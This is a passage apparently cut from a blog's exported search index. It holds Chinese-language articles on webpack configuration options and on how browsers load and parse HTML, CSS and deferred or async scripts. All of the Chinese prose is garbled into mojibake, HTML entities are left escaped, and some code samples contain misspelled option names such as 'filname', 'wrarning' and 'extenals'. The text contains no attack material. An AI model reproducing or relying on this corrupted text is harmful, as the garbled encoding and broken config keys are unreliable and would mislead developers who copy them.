è½¬æ¢æˆæ–‡ä»¶è¾“å‡ºã€‚åœ¨æ•´ä¸ªå¤„ç†æµç¨‹ä¸­ï¼Œwebpack ä¼šåœ¨æ°å½“çš„æ—¶æœºæ‰§è¡Œ Plugin å®šä¹‰çš„é€»è¾‘ã€‚ Entry entry æ˜¯ webpack æ„å»ºå…¥å£ï¼Œå¯ä»¥ç†è§£ä¸ºæ„å»ºèµ·ç‚¹ã€‚webpack å°†ä» entry é€’å½’éå†æ‰€æœ‰ä¾èµ–çš„ moduleã€‚ contextwebapck æŸ¥æ‰¾ç›¸å¯¹è·¯å¾„çš„æ–‡ä»¶ä¼šä»¥ context ä¸ºæ ¹ç›®å½•ï¼Œé»˜è®¤å€¼ä¸ºæ‰§è¡Œ webpack çš„å½“å‰å·¥ä½œç›®å½•ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¾ç½®ï¼š 123module.exports = &#123; context: path.resolve(__dirname, 'otherWorkPath'),&#125; æ³¨ï¼šcontext å¿…é¡»ä¸ºç»å¯¹è·¯å¾„ï¼Œé™¤äº†é…ç½®æ–‡ä»¶è¿˜å¯ä»¥é€šè¿‡ webpack â€”context è®¾ç½®ã€‚ å…ˆåœ¨è¿™é‡Œä»‹ç» contextï¼Œæ˜¯å› ä¸º entry è·¯å¾„å’Œå…¶ä»–ä¾èµ–æ¨¡å—çš„è·¯å¾„å¯èƒ½é‡‡ç”¨ç›¸å¯¹äº context çš„è·¯å¾„æ¥æè¿°ã€‚ entry ç”¨æ³•123456789101112//ç”¨æ³•1(å•å…¥å£ï¼‰ï¼šentry: string|Array&lt;string&gt;const config = &#123; entry: './path/to/my/entry/file.js'&#125;//ç”¨æ³•2ï¼ˆå¯¹è±¡è¯­æ³•ï¼‰ï¼šentry: &#123;[entryChunkName: string]: string|Array&lt;string&gt;&#125;const config = &#123; entry: &#123; app: './src/app.js', vendors: './src/vendors.js', &#125;&#125; è¿™åªæ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºèŒƒï¼Œåç»­æ–‡ç« ä¼šæ ¹æ®å®ä¾‹è¿›ä¸€æ­¥è¯¦ç»†è¯´æ˜ã€‚ Chunk åç§°webpack ç”Ÿæˆçš„ Chunk åç§°ä¸ Entry çš„é…ç½®æœ‰å…³ï¼š entry æ˜¯ä¸€ä¸ª string æˆ– arrayï¼Œé‚£ä¹ˆç”Ÿæˆçš„ Chunk åç§°ä¸º mainã€‚ entry æ˜¯ä¸€ä¸ª objectï¼Œé‚£ä¹ˆç”Ÿæˆçš„ Chunk åç§°ä¸º object é”®å€¼å¯¹åº”çš„é”®åã€‚ åŠ¨æ€ entryå¦‚æœæœ‰å¤šä¸ªé¡µé¢éœ€è¦é…ç½® entryï¼Œå¹¶ä¸”å¯èƒ½è¿˜ä¼šå¢åŠ æ–°çš„é¡µé¢ï¼Œentry å¯èƒ½å—å…¶ä»–å› ç´ å½±å“ä¸èƒ½å†™æˆé™æ€å€¼ï¼Œéœ€è¦åŠ¨æ€é…ç½®ï¼Œå¦‚ä¸‹ï¼š 1234567891011121314151617// åŒæ­¥entry: () =&gt; &#123; return &#123; pageOne: './pageOne/index.js', pageTwo: './pageTwo/index.js', &#125;&#125;// å¼‚æ­¥entry: () =&gt; &#123; return new Promise((resolve) =&gt; &#123; resolve(&#123; pageOne: './pageOne/index.js', pageTwo: './pageTwo/index.js', &#125;) &#125;)&#125; Output é…ç½® output é€‰é¡¹æ§åˆ¶ webpack å¦‚ä½•å‘ç¡¬ç›˜å†™å…¥æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ª objectï¼Œé‡Œé¢åŒ…å«ä¸€ç³»åˆ—é…ç½®é€‰é¡¹ã€‚ filenameé…ç½®è¾“å‡ºæ–‡ä»¶åç§°ï¼šstringï¼Œå½“åªæœ‰ä¸€ä¸ªæ–‡ä»¶æ—¶å¯ä»¥æˆé™æ€æ–‡ä»¶åï¼š 1filename: &apos;bundle.js&apos; å½“æœ‰å¤šä¸ª Chunk æ—¶ï¼Œéœ€è¦å€ŸåŠ©æ¨¡ç‰ˆå’Œå˜é‡ã€‚å‰é¢è¯´åˆ° webpack ä¼šä¸ºæ¯ä¸ª Chunk ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶åï¼Œå¯ä»¥è¿™æ ·ç”¨ï¼š 1filname: &apos;[name].js&apos; [name] ä»£è¡¨ç”¨å†…ç½®å˜é‡ name å»ä»£æ›¿ [name]ï¼Œç±»ä¼¼äº es6 çš„æ¨¡ç‰ˆå­—ç¬¦ä¸²ã€‚é™¤äº† name è¿˜åŒ…æ‹¬ï¼š idï¼š Chunk çš„å”¯ä¸€æ ‡è¯†ï¼Œä» 0 å¼€å§‹ã€‚ name: Chunk åç§°ã€‚ hash: Chunk å”¯ä¸€æ ‡è¯† çš„ hash å€¼ã€‚ chunkhash: Chunk å†…å®¹ hash å€¼ã€‚ å…¶ä¸­ hash å’Œ chunkhash å€¼çš„é•¿åº¦æ˜¯å¯æŒ‡å®šçš„ï¼Œ[chunkhash: 8] ä»£è¡¨å– 8 ä½çš„ chunkhash å€¼ï¼Œé»˜è®¤æ˜¯ 20ã€‚ æ³¨æ„ ExtractTextWebpackPlugin æ’ä»¶æ˜¯ä½¿ç”¨ contenthash æ¥ä»£è¡¨å“ˆå¸Œå€¼è€Œä¸æ˜¯ chunkhashï¼Œ åŸå› åœ¨äº ExtractTextWebpackPlugin æå–å‡ºæ¥çš„å†…å®¹æ˜¯ä»£ç å†…å®¹æœ¬èº«è€Œä¸æ˜¯ç”±ä¸€ç»„æ¨¡å—ç»„æˆçš„ Chunkã€‚ chunkFilenameoutput.chunkFilename ç”¨äºé…åˆ¶æ— å…¥å£çš„ Chunk åœ¨è¾“å‡ºæ—¶çš„æ–‡ä»¶åç§°ã€‚é€šå¸¸é…åˆ CommonsChunkPlugin(ç”¨äºæå–å…¬å…±ä»£ç çš„æ’ä»¶) å’ŒåŠ¨æ€åŠ è½½ä½¿ç”¨ã€‚é…ç½®æ–¹å¼å’Œ output.filename ä¸€æ ·ã€‚ æ³¨æ„ï¼šåœ¨ webpack4.0 commonsChunkPlugin è¢«ç§»é™¤ï¼Œç”¨ optimization.splitChunks å’Œ optimization.runtimeChunk å–ä»£ã€‚ pathoutput.path é…ç½®æ„å»ºè¾“å‡ºæ–‡ä»¶çš„ä½ç½®ï¼Œå¿…é¡»æ˜¯ string ç±»å‹çš„ç»å¯¹è·¯å¾„ã€‚ 1path: path.resolve(__dirname, &apos;dist&apos;); publicPathoutput.publicPath é»˜è®¤å€¼ä¸º â€˜â€™ ç©ºå­—ç¬¦ä¸²ï¼Œå³ webpack æ„å»ºå‡ºçš„èµ„æºé»˜è®¤ä½¿ç”¨ç›¸å¯¹è·¯å¾„ã€‚å¦‚æœéœ€è¦ä½¿ç”¨ CDN åŠ é€Ÿï¼Œè®©å®¢æˆ·ç«¯å» CDN æœåŠ¡å™¨åŠ è½½èµ„æºï¼Œåˆ™éœ€è¦æ›´æ”¹ publicPath çš„é…ç½®ï¼š 1publicPath: &apos;//cdn.example.com/assets/&apos; è¿™æ—¶å‘å¸ƒåˆ°çº¿ä¸Šçš„ä»£ç åœ°å€ä¸ºï¼š 1&lt;script src=&quot;//cdn.example.com/assets/filename_[hash].js&quot;&gt;&lt;/script&gt; crossOriginLoadingoutput.crossOriginLoading é…ç½®å¼‚æ­¥åŠ è½½èµ„æºæ˜¯å¦å¸¦ cookie: anonymous ï¼ˆé»˜è®¤ï¼‰åŠ è½½æ­¤è„šæœ¬èµ„æºæ—¶ä¸ä¼šå¸¦ä¸Šç”¨æˆ·çš„ cookieã€‚ use-credentials åŠ è½½å¼‚æ­¥èµ„æºæ—¶å¸¦ä¸Šç”¨æˆ·çš„ cookieã€‚ æ³¨æ„ï¼šè¿™é‡Œåªä»‹ç»äº†å‡ ä¸ªå¸¸ç”¨é…ç½®ï¼Œè¯¦ç»†è¯·ä¸Šå®˜æ–¹æ–‡æ¡£æŸ¥çœ‹ã€‚ä¸‹æ–‡ä¹Ÿç±»ä¼¼ã€‚ Module module é…ç½®å¦‚ä½•å¤„ç†ä¸åŒç±»å‹çš„æ¨¡å—ã€‚ é…ç½® Loaderrules é…ç½®æ¨¡å—çš„è¯»å–å’Œè§£æè§„åˆ™ï¼Œé€šå¸¸ç”¨æ¥é…ç½® loaderã€‚ç±»å‹ä¸º arrayï¼Œæè¿°äº†å¦‚ä½•å¤„ç†éƒ¨åˆ†æ–‡ä»¶ï¼Œé…ç½®è§„åˆ™å¦‚ä¸‹ï¼š æ¡ä»¶é…ç½®ï¼šé€šè¿‡ testã€includeã€exclude ä¸‰ä¸ªé…ç½®é¡¹æ¥å‘½ä¸­éœ€è¦ loader å¤„ç†çš„æ–‡ä»¶ã€‚ loader: å¯¹å‘½ä¸­çš„æ–‡ä»¶é€šè¿‡ use é…ç½®æ¥åº”ç”¨ loaderï¼Œä¹Ÿå¯ä»¥ç»™ loader ä¼ é€’å‚æ•°ã€‚ é‡ç½®é¡ºåºï¼šä¸€ç»„ loader å¤„ç†é¡ºåºé»˜è®¤æ˜¯ä»å³å¾€å·¦æ‰§è¡Œçš„ï¼Œå¯ä»¥é€šè¿‡ enforce é€‰é¡¹è®©å…¶ä¸­ä¸€ä¸ª loader æœ€å‰æˆ–æœ€å ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä¾‹å­æ¥è¯´æ˜ä¸€ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253module: &#123; rules: [ &#123; // é€šè¿‡æ­£åˆ™å‘½ä¸­ js æ–‡ä»¶ test: /\.js$/, // ä½¿ç”¨ babel-loader è½¬æ¢ js æ–‡ä»¶ // ?cacheDirectory è¡¨ç¤ºç»™ babel-loader ä¼ é€’å‚æ•°ï¼Œç”¨äºç¼“å­˜ babel ç¼–è¯‘ç»“æœåŠ å¿«é‡æ–°ç¼–è¯‘é€Ÿåº¦ use: ['babel-loader?cacheDirectory'], // åªå¤„ç† src ä¸­çš„ js æ–‡ä»¶ include: path.resolve(__dirname, 'src') &#125; ]&#125;// ä¼ é€’ç»™ loader çš„å‚æ•°å¯ä»¥æ˜¯ objectmodule: &#123; rules: [ &#123; // é€šè¿‡æ­£åˆ™å‘½ä¸­ js æ–‡ä»¶ test: /\.js$/, // ä½¿ç”¨ babel-loader è½¬æ¢ js æ–‡ä»¶ // ?cacheDirectory è¡¨ç¤ºç»™ babel-loader ä¼ é€’å‚æ•°ï¼Œç”¨äºç¼“å­˜ babel ç¼–è¯‘ç»“æœåŠ å¿«é‡æ–°ç¼–è¯‘é€Ÿåº¦ use: [&#123; loader: 'babel-loader', options: &#123; cacheDirectory: true, &#125;, // enforce: 'post' è¡¨ç¤ºè¯¥ loader æ‰§è¡Œé¡ºåºæ”¾åˆ°æœ€å // enforce: 'pre' è¡¨ç¤º loader æ‰§è¡Œé¡ºåºæ”¾åˆ°æœ€å‰é¢ enforce: 'post' &#125;], // ä¸å¤„ç† node_modules ä¸­çš„ js æ–‡ä»¶ exclude: path.resolve(__dirname, 'node_modules') &#125; ]&#125;// test | include | exclude å¯ä»¥æ˜¯æ•°ç»„module: &#123; rules: [ &#123; test: [/\.js$/, /\.ts$/], include: [ path.resolve(__dirname, 'pageOne'), path.resolve(__dirname, 'pageTwo') ], exclude: [ path.resolve(__dirname, 'node_modules'), path.resolve(__dirname, 'bower_modules') ] &#125; ]&#125; noParsenoParse ç”¨äºå¿½ç•¥æ²¡æœ‰é‡‡ç”¨æ¨¡å—åŒ–çš„æ–‡ä»¶çš„é€’å½’è§£æå’Œå¤„ç†ã€‚ä¾‹å¦‚ï¼Œjqueryã€ChartJS ç­‰ï¼š 123456789// æ­£åˆ™åŒ¹é…noParse: /jquery|chartjs/// webpack3.0 åæ”¯æŒå‡½æ•°noParse: (content) =&gt; &#123; // content è¡¨ç¤ºæ¨¡å—æ–‡ä»¶è·¯å¾„ // return true or false return /jquery|chartjs/.test(content)&#125; Resolve resolve å¯ä»¥é…ç½® webpack å¦‚ä½•å»æŸ¥æ‰¾æ¨¡å—å¯¹åº”çš„æ–‡ä»¶ã€‚ aliasresolve.alias é…ç½®é€šè¿‡åˆ«åï¼Œå°†åŸè·¯å¾„å˜ä¸ºæ–°è·¯å¾„ï¼š 1234567891011121314resolve: &#123; alias: &#123; // import .. from &apos;react-native&apos; æ›¿æ¢ä¸º // import .. from &apos;react-native-web &apos;react-native&apos;: &apos;react-native-web&apos; &#125;&#125;// å¯ä»¥é€šè¿‡ $ ç¼©å°å‘½ä¸­èŒƒå›´resolve: &#123; alias: &#123; &apos;react$&apos;: &apos;/path/to/react.min.js&apos; &#125;&#125; mainFieldsæœ‰äº›ç¬¬ä¸‰æ–¹æ¨¡å—ä¼šé’ˆå¯¹ä¸åŒç¯å¢ƒæä¾›å‡ åˆ†ä»£ç ã€‚ä¾‹å¦‚ï¼Œåˆ†åˆ«æä¾› es6 å’Œ es5 2ä»½ä»£ç ï¼š 1234&#123; &quot;jsnext:main&quot;: &quot;es/index.js&quot;, // é‡‡ç”¨ es6 è¯­æ³•å…¥å£æ–‡ä»¶ &quot;main&quot;: &quot;lib/index.js&quot; // é‡‡ç”¨ es5 è¯­æ³•å…¥å£æ–‡ä»¶&#125; webpack ä¼šæ ¹æ® mainFields é…ç½®å»å†³å®šä¼˜å…ˆé‡‡ç”¨é‚£ä»½æ–‡ä»¶ï¼Œé»˜è®¤å€¼ä¸ºï¼š 1mainFields: [&apos;browser&apos;, &apos;main&apos;] webpack ä¼šæ ¹æ®æ•°æ®é‡Œé¢çš„é¡ºåºå» package.json æ–‡ä»¶é‡Œå¯»æ‰¾ï¼Œåªä¼šæ‰¾åˆ°ç¬¬ä¸€ä¸ªã€‚å‡å¦‚æƒ³é‡‡ç”¨ es6 çš„ä»£ç ï¼Œåº”æ”¹é…ç½®ä¸ºï¼š 1mainFields: [&apos;jsnext:main&apos;, &apos;browser&apos;, &apos;main&apos;] extensionså½“å¯¼å…¥çš„æ–‡ä»¶ä¸å¸¦åç¼€æ—¶ï¼Œwebpack ä¼šè‡ªåŠ¨ç»™æ–‡ä»¶åŒ¹é…ä¸Šåç¼€ï¼Œç„¶åæŸ¥æ‰¾æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå°è¯•åç¼€åˆ—è¡¨é»˜è®¤ï¼š 1extensions: [&apos;.js&apos;, &apos;.json&apos;] è‹¥ä½ çš„ react åº”ç”¨ä½¿ç”¨çš„æ˜¯ jsx åç¼€ï¼Œå¯æ”¹é…ç½®ä¸ºï¼š 1extensions: [&apos;.jsx&apos;, &apos;.js&apos;, &apos;.json&apos;] modulesé…ç½® webpack å»å“ªæ‰¾ç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œé»˜è®¤åªä¼šåœ¨ node_modules æ‰¾ã€‚è‹¥ä½ çš„é¡¹ç›®ä¸­æœ‰å¤§é‡ç±»ä¼¼ import â€˜../../componens/buttonâ€™ è¿™æ ·çš„å¯¼å…¥æ¨¡å—è·¯å¾„ï¼Œå¯ä»¥è¿™æ ·é…ç½®ï¼š 1modules: [&apos;./src/components&apos;, &apos;node_modules&apos;] ç„¶åé€šè¿‡ import â€˜buttonâ€™ å¯¼å…¥ï¼Œæé«˜å¼€å‘æ•ˆç‡ã€‚ Plugins plugin ç”¨äºæ‰©å±• webpack çš„åŠŸèƒ½ï¼Œç¤¾åŒºæœ‰å„ç§ plugin å‡ ä¹å¯ä»¥åšä»»ä½•æ„å»ºç›¸å…³çš„äº‹æƒ…ã€‚ plugin é…ç½®plugin é…ç½®å¾ˆç®€å•ï¼Œå°† plugin çš„å®ä¾‹ä¼ å…¥ plugins å³å¯ã€‚plugin éœ€è¦çš„å‚æ•°å¯ä»¥é€šè¿‡ æ„é€ å‡½æ•°ä¼ å…¥ï¼š 12345678plugins: [ new webpack.optimize.UglifyJsPlugin(&#123; compress: &#123; wrarning: false, drop_console: false, &#125; &#125;)] DevServer åªæœ‰é€šè¿‡ DevServer å¯åŠ¨ webpack æ—¶ï¼ŒdevServer é€‰é¡¹æ‰ä¼šç”Ÿæ•ˆï¼Œwebpack æœ¬èº«å¹¶ä¸è®¤è¯† devServerã€‚ hotdevServer.hot æ˜¯å¦å¯ç”¨çƒ­æ¨¡å—æ›¿æ¢åŠŸèƒ½ã€‚å¯ç”¨çƒ­æ¨¡å—æ›¿æ¢åï¼Œå°†ä¼šåœ¨ä¸åˆ·æ–°é¡µé¢çš„æƒ…å†µä¸‹ç”¨æ–°æ¨¡å—ä»£æ›¿æ—§æ¨¡å—ã€‚ historyApiFallbackdevServer.historyApiFallback ç”¨äºä½¿ç”¨äº† HTML5 History API çš„å•é¡µåº”ç”¨ã€‚è¿™ç±»åº”ç”¨è¦æ±‚æœåŠ¡å™¨é’ˆå¯¹ä»»ä½•å‘½ä¸­çš„è·¯ç”±éƒ½è¿”å›åŒä¸€ä¸ª HTML æ–‡ä»¶ï¼š 1historyApiFallback: true è‹¥æœ‰å¤šä¸ªå•é¡µåº”ç”¨ï¼š 1234567historyApiFallback: &#123; rewrites: [ &#123;from: /^\/user/, to: &apos;user.html&apos;&#125;, &#123;from: /^\/game/, to: &apos;game.html&apos;&#125;, &#123;from: /./, to: &apos;index.html&apos;&#125; ]&#125; httpsDevServer é»˜è®¤ä½¿ç”¨ HTTPï¼Œä½†æ˜¯å½“ä½ ä½¿ç”¨ HTTP/2 å’Œ Service Worker å¿…é¡»ä½¿ç”¨ https: 123devServer: &#123; https: true&#125; opendevServer.open é…ç½®æ˜¯å¦åœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶åœ¨é»˜è®¤æµè§ˆå™¨ä¸Šæ‰“å¼€å¼€å‘ç½‘é¡µã€‚ å…¶ä»–é…ç½®é¡¹ é™¤äº†ä¸Šé¢çš„é…ç½®é¡¹ï¼Œwebpack è¿˜æä¾›äº†ä¸€äº›é›¶æ•£çš„é…ç½®é¡¹ã€‚ä¸‹é¢ä»‹ç»å‡ ä¸ªå¸¸ç”¨çš„ã€‚ Targetjs çš„åº”ç”¨åœºæ™¯è¶Šæ¥è¶Šå¤šï¼Œwebpack å¯ä»¥æ ¹æ®ä¸åŒç¯å¢ƒæ„å»ºå‡ºä¸åŒçš„ä»£ç ï¼š targetå€¼ æè¿° web é’ˆå¯¹æµè§ˆå™¨ï¼ˆé»˜è®¤ï¼‰ï¼Œæ‰€æœ‰ä»£ç é›†ä¸­åœ¨ä¸€ä¸ªæ–‡ä»¶ node é’ˆå¯¹ nodejsï¼Œä½¿ç”¨ require è¯­å¥åŠ è½½ chunk async-node é’ˆå¯¹ nodejsï¼Œå¼‚æ­¥åŠ è½½ chunk webworker é’ˆå¯¹ webworker electron-main é’ˆå¯¹ electron ä¸»çº¿ç¨‹ electron-render é’ˆå¯¹ electron æ¸²æŸ“çº¿ç¨‹ ä¾‹å¦‚ï¼Œå½“è®¾ç½® target: â€˜nodeâ€™ æ—¶ï¼Œrequire(â€˜fsâ€™) å°±ä¸ä¼šå°† fs æ¨¡å—å¯¼å…¥ chunkï¼Œæ›´è¯¦ç»†çš„ä»‹ç»è¯·çœ‹å¦ä¸€ç¯‡æ–‡ç« ï¼šwebpackä¹‹reactåŒæ„åº”ç”¨ã€‚ Devtoolé…ç½® webpack å¦‚ä½•ç”Ÿæˆ Source Mapï¼Œæ–¹ä¾¿è¿›è¡Œä»£ç è°ƒè¯•ã€‚é»˜è®¤å€¼ä¸º falseï¼Œå³ä¸ç”Ÿæˆ Source Mapï¼Œå¯ä»¥è¿™æ ·é…ç½®ï¼š 1devtool: &apos;source-map&apos; extenalsextenals å‘Šè¯‰ webpack å“ªäº›æ¨¡å—ä¸ç”¨è¢«æ‰“åŒ…è¿›å»ï¼Œè€Œæ˜¯ç”±å¤–éƒ¨ç¯å¢ƒæä¾›ï¼Œä¾‹å¦‚ï¼Œå½“ html æ–‡ä»¶ä¸­æœ‰ï¼š 1&lt;script src=&quot;/path/to/jquery.js&quot;&gt;&lt;/script&gt; å¯ä»¥è¿™æ ·é…ç½®ï¼Œé˜²æ­¢é¡µé¢åŠ è½½ä¸¤ä»½ jquery æ–‡ä»¶ï¼ˆurl ä¸€ä»½ï¼Œæ‰“åŒ…ä¸€ä»½ï¼‰ï¼š 1234externals: &#123; // æŠŠå¯¼å…¥è¯­å¥é‡Œçš„ jquery æ›¿æ¢æˆè¿è¡Œç¯å¢ƒçš„å…¨å±€å˜é‡ jQuery jquery: &apos;jQuery&apos;&#125; å¯¼å‡ºå¤šç§é…ç½® é€šå¸¸éœ€è¦ä»ä¸€ä»½æºç ä¸­æ„å»ºå‡ºå¤šä»½ä»£ç ï¼ˆå¼€å‘ç¯å¢ƒã€çº¿ä¸Šç¯å¢ƒï¼‰ç­‰ï¼Œä½†æ˜¯ä¹‹é—´çš„é…ç½®åˆå¾ˆç›¸ä¼¼ï¼Œå¦‚æœå†™ä¸¤ä»½é…ç½®æ–‡ä»¶ï¼Œåˆ™éœ€è¦ç»´æŠ¤ä¸¤ä»½é…ç½®æ–‡ä»¶ï¼Œå·¥ä½œé‡å¤§ï¼Œè¿˜å®¹æ˜“å‡ºé”™ï¼Œè¿™æ—¶å¯ä»¥å¯¼å‡ºä¸€ä¸ª Functionï¼Œé€šè¿‡ä¸€ä¸ªé…ç½®æ–‡ä»¶å®Œæˆè¦æ±‚ï¼š 12345678910111213141516171819202122const path = require('path');const UglifyJsPlugin = require('webpack/lib/optimize/UglifyJsPlugin');module.exports = function (env = &#123;&#125;, argv) &#123; const plugins = []; const isProduction = env['production']; // åœ¨ç”Ÿæˆç¯å¢ƒæ‰å‹ç¼© if (isProduction) &#123; plugins.push( // å‹ç¼©è¾“å‡ºçš„ JS ä»£ç  new UglifyJsPlugin() ) &#125; return &#123; plugins: plugins, // åœ¨ç”Ÿæˆç¯å¢ƒä¸è¾“å‡º Source Map devtool: isProduction ? undefined : 'source-map', &#125;;&#125; å‚è€ƒé“¾æ¥ æ·±å…¥æµ…å‡º webpackï¼š http://webpack.wuhaolin.cn/ webpack ä¸­æ–‡å®˜ç½‘ï¼š https://doc.webpack-china.org/configuration/]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æµè§ˆå™¨åŠ è½½æ–‡ä»¶åŠå…¶è§£æé¡ºåº]]></title>
    <url>%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%A0%E8%BD%BD%E6%96%87%E4%BB%B6%E5%8F%8A%E5%85%B6%E8%A7%A3%E6%9E%90%E8%BF%90%E8%A1%8C%E9%A1%BA%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[æµè§ˆå™¨åŠ è½½æ–‡ä»¶åŠå…¶è§£æé¡ºåº ç”¨æˆ·è¾“å…¥ç½‘å€ï¼ˆå‡è®¾æ˜¯ä¸ª HTML é¡µé¢ï¼Œå¹¶ä¸”æ˜¯é¦–æ¬¡è®¿é—®ï¼‰ï¼Œæµè§ˆå™¨å‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ ä¸‹è½½ HTMLï¼Œå¹¶è§£ææ‰§è¡Œï¼Œé€æ­¥æ„å»º DOM æ ‘ å¦‚æœå‘ç°æœ‰å¤–éƒ¨ css æ–‡ä»¶ï¼Œè¿›è¡Œå¼‚æ­¥åŠ è½½ï¼Œä¸ä¼šé˜»å¡ HTML çš„è§£æ æ³¨ï¼šå¦‚æœä½¿ç”¨ HTTP/2 æ¨é€æŠ€æœ¯ï¼Œå¯ä»¥æå‰è¿›è¡Œèµ„æºçš„æ¨é€ è‹¥æœå‘ç° HTML æ–‡æ¡£ä¸­çš„å›¾ç‰‡èµ„æºï¼Œè¿›è¡ŒåŠ è½½ï¼Œä¹Ÿä¸ä¼šé˜»å¡ HTML è§£æï¼Œè¿™é‡Œåˆ†ä¸ºä¸¤ç§æƒ…å†µï¼› ä½¿ç”¨ HTTP/1.x åè®®ï¼Œèµ„æºæ˜¯ä¸²å‹åŠ è½½çš„ï¼Œæ‰€ä»¥æµè§ˆé€šè¿‡å¼€å¯å¤šä¸ªè¿æ¥è¿›è¡Œå¹¶è¡ŒåŠ è½½ï¼Œä½†æ˜¯å¼€å¯å¤šä¸ªè¿æ¥çš„æ•°æ®é‡æœ‰é™åˆ¶4-8ä¸ªå·¦å³ï¼Œå¦‚æœä¸€ä¸ªé¡µé¢å›¾ç‰‡å¤šï¼ˆè¿˜åŒ…å«å…¶ä»–èµ„æºï¼‰é‚£ä¹ˆä¼šé˜»å¡å›¾ç‰‡çš„ä¸‹è½½ ä½¿ç”¨ HTTP/2 å…¨éƒ¨å›¾ç‰‡è¿›è¡Œå¼‚æ­¥åŠ è½½ä¸ä¼šè§£ææ‰§è¡Œ å¦‚æœé‡åˆ° script èŠ‚ç‚¹ï¼Œæƒ…å†µæ¯”è¾ƒå¤æ‚ï¼Œæˆ‘ä»¬åˆ†æƒ…å†µè¯¦ç»†è®¨è®º æ™®é€š script å› ä¸º js æœ‰å¯èƒ½ä¼šä¿®æ”¹ DOMã€‚æ¯”å¦‚è¯´ document.writeï¼Œæ‰€ä»¥æµè§ˆå™¨é‡åˆ° js æ–‡ä»¶æ—¶ï¼Œä¼šåœæ­¢åé¢çš„ HTML è§£æï¼Œç­‰å¾… js æ‰§è¡Œå®Œåï¼Œå†å»è§£æåé¢ HTML æ–‡æ¡£ å¦‚æœæ­¤æ—¶æœ‰æœªåŠ è½½å®Œçš„æ ·å¼æ–‡ä»¶ï¼Œæµè§ˆå™¨ä¸ä¼šæ„å»ºæ¸²æŸ“æ ‘ï¼Œå±å¹•ä¼šä¸€ç›´æ˜¾ç¤ºç©ºç™½ã€‚HTML å’Œ CSS éƒ½æ˜¯é˜»å¡æ¸²æŸ“èµ„æºï¼Œåº”è¯¥å°½å¯èƒ½æ—©åœ°ä¸‹è½½ å¦‚æœå·²ç»åŠ è½½å®Œæ ·å¼æ–‡ä»¶ï¼Œåˆ™ä¼šæ„å»ºæ¸²æŸ“æ ‘ï¼Œå…ˆæ¸²æŸ“å·²è§£æå®Œçš„ DOMï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ ä¸ºäº†å‡ç¼“æ¸²æŸ“è¢«é˜»å¡çš„æƒ…å†µï¼Œç°ä»£æµè§ˆå™¨éƒ½æ˜¯ç”¨äº†çŒœæµ‹é¢„åŠ è½½ï¼ˆspecculative loading)ï¼Œå½“æ¸²æŸ“è¢«é˜»å¡çš„æ—¶å€™ï¼Œå®ƒä¼šåšä»¥ä¸‹ä¸€äº›äº‹ï¼š è½»é‡çº§çš„ HTML ï¼ˆæˆ– CSSï¼‰æ‰«æå™¨ï¼ˆscannerï¼‰ç»§ç»­åœ¨æ–‡æ¡£ä¸­æ‰«æ æŸ¥æ‰¾å“ªäº›å°†æ¥å¯èƒ½èƒ½å¤Ÿç”¨åˆ°çš„èµ„æºæ–‡ä»¶çš„ URL åœ¨æ¸²æŸ“å™¨ä½¿ç”¨å®ƒä»¬ä¹‹é—´å°†å…¶ä¸‹è½½ä¸‹æ¥ ä¹Ÿå¯ä»¥åˆ©ç”¨ http/2 æ¨é€åŠŸèƒ½å°†èµ„æºå…ˆä»æœåŠ¡å™¨æ¨é€ä¸‹æ¥ è¿™ä¹Ÿå°±è§£æä¸ºäº†ä»€ä¹ˆ css è¦æ”¾åœ¨é¡µé¢é¡¶éƒ¨ï¼Œè€Œ js æ”¾åœ¨åº•éƒ¨ defer script ä¸é˜»æ­¢è§£æ HTMLï¼Œå¹¶è¡Œä¸‹è½½ js å³ä½¿ä¸‹è½½å®Œæ–‡ä»¶ä»ç„¶ç»§ç»­è§£æ HTML æŒ‰ç…§é¡µé¢ä¸­å‡ºç°çš„é¡ºåºï¼Œåœ¨å…¶ä»–åŒæ­¥è„šæœ¬æ‰§è¡Œåï¼ŒDOMContendLoaded äº‹ä»¶å‰ä¾æ¬¡æ‰§è¡Œ defer æ–‡ä»¶ async script ä¸é˜»æ­¢è§£æ HTMLï¼Œå¹¶è¡Œä¸‹è½½ js æ–‡ä»¶ å½“è„šæœ¬ä¸‹è½½å®Œæ¯•åï¼Œç«‹å³è§£ææ‰§è¡Œï¼Œasync çš„æ‰§è¡Œé¡ºåºä¸ç¡®å®šï¼Œæ‰§è¡Œé˜¶æ®µä¹Ÿä¸ç¡®å®š å› ä¸ºé¡ºåºæ— å…³ï¼Œæ‰€ä»¥å¾ˆé€‚åˆåƒ Google Analytics è¿™æ ·çš„æ— ä¾èµ–è„šæœ¬ å› ä¸º js æ‰§è¡Œçº¿ç¨‹å’Œ GUI æ¸²æŸ“çº¿ç¨‹äº’æ–¥ï¼Œæ‰€ä»¥åœ¨ js æ‰§è¡Œçš„æ—¶å€™éƒ½ä¼šå†»ç»“ GUI æ¸²æŸ“çº¿ç¨‹ï¼ŒGUI æ›´æ–°ä¼šè¢«ä¿å­˜åˆ°ä¸€ä¸ªé˜Ÿåˆ—ä¸­ç­‰åˆ°å¼•æ“çº¿ç¨‹ç©ºé—²æ—¶ç«‹å³è¢«æ‰§è¡Œã€‚ å› ä¸ºæµè§ˆå™¨ä¸çŸ¥é“ js æ‰§è¡Œä¼šä¸ä¼šæ”¹å˜ domï¼Œæ‰€ä»¥å³ä½¿æ˜¯ async çš„æ‰§è¡Œä¹Ÿä¼šé˜»å¡ dom è§£æ å…¶ä»– å¦‚æœ script æ—  src å±æ€§ï¼Œåˆ™ deferï¼Œasync ä¼šè¢«å¿½ç•¥ åŠ¨æ€æ·»åŠ çš„ script æ ‡ç­¾éšå« async å±æ€§ åŠ å¿« HTML é¡µé¢åŠ è½½é€Ÿåº¦ç­–ç•¥ 